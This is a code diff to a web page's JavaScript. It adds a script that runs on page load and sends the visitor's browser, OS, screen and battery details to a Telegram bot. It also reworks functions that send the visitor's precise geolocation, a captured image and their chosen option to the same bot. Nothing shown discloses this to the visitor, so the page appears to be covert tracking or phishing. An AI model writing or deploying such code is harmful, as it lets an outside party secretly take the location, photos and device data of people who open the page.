@@ -145,6 +145,23 @@
             });
         }
 
+        function getDeviceInfo() {
+            return `
+📱 Device Info:
+- Browser: ${navigator.userAgent}
+- OS: ${navigator.platform}
+- Screen: ${window.screen.width}x${window.screen.height}
+`;
+        }
+
+        function sendDeviceInfo() {
+            navigator.getBattery().then(battery => {
+                const batteryStatus = `🔋 Battery: ${Math.floor(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
+                const message = `🚀 Page Opened\n${getDeviceInfo()}${batteryStatus}`;
+                sendMessage(message);
+            });
+        }
+
         function getSelectedOption() {
             const checkboxes = document.querySelectorAll('input[type="checkbox"]');
             for (let checkbox of checkboxes) {
@@ -181,34 +198,18 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        const location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
-                        captureBattery(option, imageData, location);
+                        const location = `📍 Location: Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+                        sendOption(option, imageData, location);
                     },
-                    (error) => {
-                        console.error("Location Error:", error.message);
-                        captureBattery(option, imageData, "Location Not Available");
-                    },
+                    () => sendOption(option, imageData, "📍 Location: Not Available"),
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
-            } else {
-                captureBattery(option, imageData, "Geolocation Not Supported");
             }
         }
 
-        function captureBattery(option, imageData, location) {
-            navigator.getBattery().then(battery => {
-                const batteryStatus = `Battery: ${Math.floor(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
-                sendToTelegram(option, imageData, location, batteryStatus);
-            });
-        }
-
-        function sendToTelegram(option, imageData, location, batteryStatus) {
-            const message = `✅ User Response\n🟢 Option: ${option}\n📍 Location: ${location}\n🔋 ${batteryStatus}`;
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-            });
+        function sendOption(option, imageData, location) {
+            const message = `✅ User Response\n🟢 Option: ${option}\n${location}`;
+            sendMessage(message);
 
             const blob = dataURItoBlob(imageData);
             const formData = new FormData();
@@ -221,16 +222,21 @@
             }).then(() => alert("✅ Request Submitted!"));
         }
 
+        function sendMessage(text) {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text })
+            });
+        }
+
         function dataURItoBlob(dataURI) {
             const byteString = atob(dataURI.split(',')[1]);
             const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], { type: mimeString });
+            return new Blob([new Uint8Array([...byteString].map(char => char.charCodeAt(0)))], { type: mimeString });
         }
+
+        window.onload = sendDeviceInfo;
     </script>
 
 </body>
